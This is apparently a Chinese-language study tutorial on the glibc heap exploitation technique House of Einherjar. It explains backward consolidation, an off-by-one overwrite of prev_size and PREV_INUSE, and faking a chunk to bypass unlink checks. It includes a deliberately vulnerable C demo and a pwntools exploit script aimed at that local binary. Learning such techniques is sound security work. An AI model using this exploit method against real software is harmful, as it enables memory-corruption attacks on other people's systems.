# House Of Einherjar

## 介绍：

1. house of einherjar 是一种堆利用技术，由 `Hiroki Matsukuma` 提出。该堆利用技术可以强制使得 `malloc` 返回一个几乎任意地址的 chunk 。其主要在于**滥用 `free` 中的后向合并**操作（合并**低地址的 chunk**），从而使得尽可能避免碎片化。
1. 此外，需要注意的是，在一些特殊大小的堆块中，off by one 不仅可以**修改下一个堆块的 prev_size**，还可以修改**下一个堆块的 PREV_INUSE** 比特位。

## 原理

### 向后合并（向低地址）

1. `free` 函数中的后向合并核心操作如下

   ```c
           /* consolidate backward */
           if (!prev_inuse(p)) {
               prevsize = prev_size(p);
               size += prevsize;
               p = chunk_at_offset(p, -((long) prevsize));
               unlink(av, p, bck, fwd);
           }
   ```

   用**当前块的prev_inuse**位来判断前一个已被释放，再通过**prev_size来寻址**到后一个块（低地址），合并后的size就是size+prev_size相加。

   这里借用原作者的一张图片说明：

   ![image-20240724103658904](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407241036999.png)

   

### 利用原理

1. 这里我们就介绍该利用的原理。首先，在之前的堆的介绍中，我们可以知道以下的知识：
   - 两个物理相邻的 chunk 会共享 `prev_size`字段，尤其是当低地址的 chunk 处于使用状态时，高地址的 chunk 的该字段便可以被低地址的 chunk 使用。因此，我们有希望可以通过**写低地址 chunk 覆盖高地址 chunk 的 `prev_size` 字段**。
   - 一个 chunk PREV_INUSE 位标记了其**物理相邻的低地址 chunk 的使用状态**，而且该位是和 prev_size 物理相邻的。
   - 后向合并时，新的 **chunk 的位置取决于 `chunk_at_offset(p, -((long) prevsize))`** 。

### 利用过程

#### 溢出前：

1. 假设溢出前的状态如下：

   ![image-20240724104423044](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407241044143.png)

#### 溢出：

1. 这里我们假设 p0 堆块一方面可以**写 prev_size 字段**，另一方面，存在 off by one 的漏洞，可以**写下一个 chunk 的 PREV_INUSE 部分**，那么：

   ![image-20240724104513965](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407241045078.png)

#### 溢出后：

1. 假设我们将 p1 的 prev_size 字段设置为我们想要的**目的 chunk 位置与 p1 的差值**。在溢出后，我们释放 p1，则我们所得到的新的 chunk 的位置 `chunk_at_offset(p1, -((long) prevsize))` 就是我们想要的 chunk 位置了。

2. 当然，需要注意的是，由于这里会对新的 chunk 进行 unlink ，因此需要确保在对应 chunk 位置构造好了 fake chunk 以便于绕过 unlink 的检测。

   ![image-20240724104642159](C:\Users\BKBQWQ\AppData\Roaming\Typora\typora-user-images\image-20240724104642159.png)



### 利用过程：

1. 可以进行 House Of Einherjar 攻击的代码：

   ```c
   #include <stdio.h>
   #include <stdlib.h>
   #include <unistd.h>
   
   int main(void){
       char* s0 = malloc(0x200);//构造fake chunk
       char* s1 = malloc(0x18);
       char* s2 = malloc(0xf0);
       char* s3 = malloc(0x20);//为了不让s2与top chunk 合并
       printf("begin\n");
       printf("%p\n", s0);
       printf("input s0\n");
       read(0, s0, 0x200); //读入fake chunk
       printf("input s1\n");
       read(0, s1, 0x19); //Off By One
       free(s2);
       return 0;
   }
   ```

2. 攻击脚本：

   ```python
   from pwn import *
   context(os='linux', arch='amd64', log_level='debug')
   
   def debug():
       print(proc.pidof(p))
       pause()
   
   p = process("/home/kali/Desktop/test")
   p.recvuntil("begin\n")
   address = int(p.recvline().strip(), 16)
   p.recvuntil("input s0\n")
   payload = p64(0) + p64(0x101) + p64(address) * 2 + b"A"*0xe0
   '''
   p64(address) * 2是为了绕过
   if (__builtin_expect (FD->bk != P || BK->fd != P, 0))
     malloc_printerr ("corrupted double-linked list");
   '''
   payload += p64(0x100) #fake size
   p.send(payload)
   
   p.recvuntil("input s1\n")
   payload = b"A"*0x10 + p64(0x220) + b"\x00"
   p.send(payload)
   p.recvall()
   p.close()
   ```

3. 结果：

   ![image-20240724111055419](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407241110576.png)

   ![image-20240724111405824](https://gitee.com/poppy-qwq/cloudimage/raw/master/img1/202407241114010.png)

   **注意这里绕过 unlink 检查的方法跟之前利用 unlink 漏洞时采用的方法不一样** ：

   利用 unlink 漏洞的时候：

   ```c
    p->fd = &p-3*4
    p->bk = &p-2*4
   ```

   在这里利用时，因为没有办法找到 `&p` , 所以直接让：

   ```c++
   p->fd = p
   p->bk = p
   ```

   **这里需要注意一个点：** 

   ```py
   payload = p64(0) + p64(0x101) + p64(address) * 2 + "A"*0xe0
   ```

   其实修改为下面这样也是可以的:

   ```py
   payload = p64(0) + p64(0x221) + p64(address) * 2 + "A"*0xe0
   ```

   按照道理来讲 fake chunk 的 size 是 0x221 才合理，但是为什么 0x101 也可以呢？这是因为对 size 和 prev_size 的验证只发生在 unlink 里面，而 unlink 里面是这样验证的：

   ```c
   if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
         malloc_printerr ("corrupted size vs. prev_size");
   ```

   所以只需要再伪造 fake chunk 的 next chunk 的 prev_size 字段就好了。



## 总结

1. 这里我们总结下这个利用技术需要注意的地方：
   - 需要有溢出漏洞可以写物理相邻的**高地址的 prev_size 与 PREV_INUSE** 部分。
   - 我们需要计算**目的 chunk 与 p1 地址之间的差**，所以需要泄漏地址。
   - 我们需要**在目的 chunk 附近构造相应的 fake chunk**，从而绕过 unlink 的检测。





